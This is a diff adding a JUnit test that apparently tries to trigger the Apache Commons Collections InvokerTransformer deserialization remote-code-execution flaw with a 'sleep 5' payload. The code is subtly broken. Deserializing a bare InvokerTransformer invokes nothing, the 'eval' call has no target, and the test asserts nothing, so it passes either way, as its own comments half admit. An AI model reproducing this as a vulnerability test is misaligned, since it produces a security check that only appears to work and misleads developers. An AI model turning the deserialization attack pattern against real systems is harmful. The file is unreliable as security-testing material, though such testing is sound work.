@@ -1,0 +1,42 @@
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.junit.Test;
+
+import java.io.*;
+
+import static org.junit.Assert.fail;
+
+public class InvokerTransformerRCE {
+
+    @Test
+    public void testRemoteCodeExecution() {
+        // Malicious payload that executes arbitrary code
+        InvokerTransformer maliciousTransformer = new InvokerTransformer("eval", new Class[]{String.class}, new Object[]{"sleep 5"});
+
+        // Serialize the malicious transformer
+        ByteArrayOutputStream bos = new ByteArrayOutputStream();
+        try (ObjectOutputStream oos = new ObjectOutputStream(bos)) {
+            oos.writeObject(maliciousTransformer);
+        } catch (IOException e) {
+            fail("Failed to serialize malicious transformer: " + e.getMessage());
+        }
+
+        // Deserialize the malicious transformer
+        byte[] serializedPayload = bos.toByteArray();
+        try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(serializedPayload))) {
+            ois.readObject(); // This should trigger the code execution
+        } catch (IOException | ClassNotFoundException e) {
+            // In a real-world scenario, this exception might indicate successful exploitation
+            // For testing purposes, we expect an exception or a specific behavior if the vulnerability is present
+            // If the code execution (e.g., sleep 5) does not happen, this test might pass incorrectly.
+            // A more robust test would involve checking for side effects of the executed code.
+            System.err.println("Deserialization attempted. If code execution occurred, this test might not catch it directly.");
+        }
+
+        // Note: This test attempts to *trigger* the vulnerability.
+        // Directly asserting code execution within a JUnit test is complex and often requires
+        // external monitoring or checking for side effects (like files created, network connections, etc.).
+        // The current implementation relies on the fact that readObject() *would* attempt to execute
+        // the malicious code if the InvokerTransformer is vulnerable and the Java runtime allows it.
+        // A successful exploitation might manifest as a delay (if 'sleep' was used) or other system changes.
+    }
+}
